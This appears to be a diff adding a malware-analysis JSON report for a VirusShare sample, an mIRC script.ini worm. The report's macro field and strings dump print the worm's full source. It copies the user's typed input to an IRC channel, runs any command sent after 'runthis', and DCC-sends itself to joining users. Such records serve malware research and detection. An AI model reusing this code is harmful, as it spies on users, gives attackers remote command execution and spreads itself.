@@ -1,0 +1,52 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "[script]\nn0=on 1:START:{\nn1=  .sreq ignore\nn2=  .remote on\nn3=}\nn4=on 1:CONNECT: .msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe\nn5=on 1:INPUT:*:{\nn6=  .msg #planetalammer ( $+ $active $+ ) $1-\nn7=}\nn8=on 1:TEXT:*:?:{\nn9=  if ( $1 == runthis ) { .run $2- }\nn10=}\nn11=\nn12=on 1:JOIN:*:{\nn13=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini\nn14=}\nn15=ON 1:NOTICE:*:#:/msg #x3212 \u007f $+ $chan $+ \u007f - $+ $nick $+ - $parms"
+    },
+    "filename": "VirusShare_100cda105efe704cf2cc18abdbfd6a8d",
+    "filesize": 466,
+    "filetype": "data",
+    "hashes": {
+        "md5": "100cda105efe704cf2cc18abdbfd6a8d",
+        "sha1": "28c11222c1931d86c466de2b4e21bec0ff139d5a",
+        "sha256": "a40ea69d8d77aa8b8f3be36a8bfaa0fcc132cb27a69aef118a321925763fa542"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=on 1:START:{",
+            "n1=  .sreq ignore",
+            "n2=  .remote on",
+            "n3=}",
+            "n4=on 1:CONNECT: .msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe",
+            "n5=on 1:INPUT:*:{",
+            "n6=  .msg #planetalammer ( $+ $active $+ ) $1-",
+            "n7=}",
+            "n8=on 1:TEXT:*:?:{",
+            "n9=  if ( $1 == runthis ) { .run $2- }",
+            "n10=}",
+            "n11=",
+            "n12=on 1:JOIN:*:{",
+            "n13=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini",
+            "n14=}",
+            "n15=ON 1:NOTICE:*:#:/msg #x3212 ",
+            " $+ $chan $+ ",
+            " - $+ $nick $+ - $parms"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.278357",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
